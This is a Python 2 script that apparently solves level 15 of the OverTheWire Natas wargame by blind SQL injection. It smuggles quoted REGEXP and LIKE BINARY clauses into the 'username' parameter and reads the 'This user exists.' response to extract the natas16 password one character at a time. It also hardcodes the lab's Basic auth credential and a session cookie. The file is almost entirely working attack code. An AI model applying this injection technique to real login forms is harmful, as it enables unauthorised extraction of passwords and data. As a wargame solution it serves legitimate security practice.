#!/usr/bin/python
import urllib
import urllib2
import string

# Host: natas15.natas.labs.overthewire.org
# User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==
# Connection: keep-alive
# Cookie: __cfduid=d343ee483747c1158b3dd095b778a57ff1549137174
# Upgrade-Insecure-Requests: 1
# Cache-Control: max-age=0

KEYSLAP={
'A-G':'ABCDEFG',
'H-N':'HIJKLMN',
'O-U':'OPQRSTU',
'V-Z':'VWXYZ',
'a-g':'abcdefg',
'h-n':'hijklmn',
'o-u':'opqrstu',
'v-z':'vwxyz',
'0-4':'01234',
'5-9':'56789',
}


def reqLIKE(pattern = ''):
    url =  'http://natas15.natas.labs.overthewire.org/index.php?'
    url += urllib.urlencode({'debug':'true', 'username':'natas16\" and password LIKE BINARY \"{}%'.format(pattern)})
    request = urllib2.Request(url)
    request.add_header('Authorization', 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==')
    request.add_header('Cookie', '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174')
    request.add_header('User-Agent', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0')
    r =  urllib2.urlopen(request)
    s=r.read()
    return s.find('This user exists.')

def reqREGEXP(pattern = '', key = ''):
    url =  'http://natas15.natas.labs.overthewire.org/index.php?'
    url += urllib.urlencode({'debug':'true', 'username':'natas16\" and password REGEXP BINARY \"^{}[{}]'.format(key, pattern)})
    request = urllib2.Request(url)
    request.add_header('Authorization', 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==')
    request.add_header('Cookie', '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174')
    request.add_header('User-Agent', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0')
    r =  urllib2.urlopen(request)
    s=r.read()
    return s.find('This user exists.')


# main funtion
def main():
    key = ''
    lastpassword = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
    possible = string.digits + string.ascii_uppercase + string.ascii_lowercase
    for _ in xrange(len(lastpassword)):
        for i in KEYSLAP.keys():
            ans = reqREGEXP(pattern = i, key=key)
            if ans>0:
                print "[+] PATTERN FOUND : ", i
                for j in KEYSLAP[i]:
                    ans1 = reqLIKE(pattern = key+j)
                    if ans1>0:
                        key += j
                        print "[+] EXACT KEY : ", j
                        break
                break
                
        print key
    return






if __name__=='__main__':
    main()
